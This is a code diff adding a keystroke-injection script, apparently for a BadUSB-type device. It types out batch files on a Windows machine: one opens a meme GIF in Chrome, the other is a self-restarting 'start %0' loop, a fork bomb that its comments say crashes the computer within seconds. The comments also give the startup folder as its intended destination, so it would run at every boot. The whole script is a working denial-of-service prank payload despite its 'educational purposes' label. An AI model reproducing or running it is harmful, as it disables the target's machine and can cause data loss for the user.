@@ -1,0 +1,78 @@
+Rem: Warning besure to change the destination from shell:startup to something like shell:Desktop for testing or you will have a problem :)
+Rem: you have been warned!!!!!!!
+Rem: This script will open a meme on the users Computer, providing they have internet access and then force CMD to open recursively and very quickly, eating up all available memory, the user will be forced to hard reset there box.
+Rem: Tested on i5, 16GB ram, windows 7 only, caused crash after approx 5 seconds
+Rem: For Educational Purposes Only, Enjoy.
+Rem: You may have to change the delay times to suit your machine.....
+Rem: Made By Hackabus
+Rem:-----
+Press:131+114
+CustomDelay:500
+Print:shell:Desktop
+Press:176
+CustomDelay:1000
+Press:130+102
+CustomDelay:1000
+Print:w
+CustomDelay:1000
+Print:t
+CustomDelay:1000
+Press:128+97
+CustomDelay:1000
+Press:212
+CustomDelay:1000
+Print:troll.bat
+CustomDelay:1000
+Press:176
+Press:176
+CustomDelay:500
+Press:129+203
+CustomDelay:500
+Print:e
+CustomDelay:500
+Print:start chrome.exe --app=https://media.giphy.com/media/Btv7SwSH15KGk/giphy-downsized.gif --window-position=1000,0 --window-size=500,500
+CustomDelay:500
+Press:128+115
+CustomDelay:800
+Press:130+197
+CustomDelay:500
+Press:130+102
+CustomDelay:500
+Print:w
+CustomDelay:500
+Print:t
+CustomDelay:500
+Press:128+97
+CustomDelay:500
+Press:212
+CustomDelay:500
+Print:mem.bat
+CustomDelay:500
+Press:176
+Press:176
+CustomDelay:500
+Press:129+203
+CustomDelay:500
+Print:e
+CustomDelay:500
+Press:176
+CustomDelay:500
+Print:start troll.bat
+Press:176
+CustomDelay:500
+Print:timeout /t 3
+Press:176
+CustomDelay:500
+Print::runthis
+Press:176
+CustomDelay:500
+Print:start %0
+Press:176
+CustomDelay:500
+Print:goto runthis
+CustomDelay:500
+Press:128+115
+CustomDelay:800
+Press:130+197
+CustomDelay:500
+Press:176
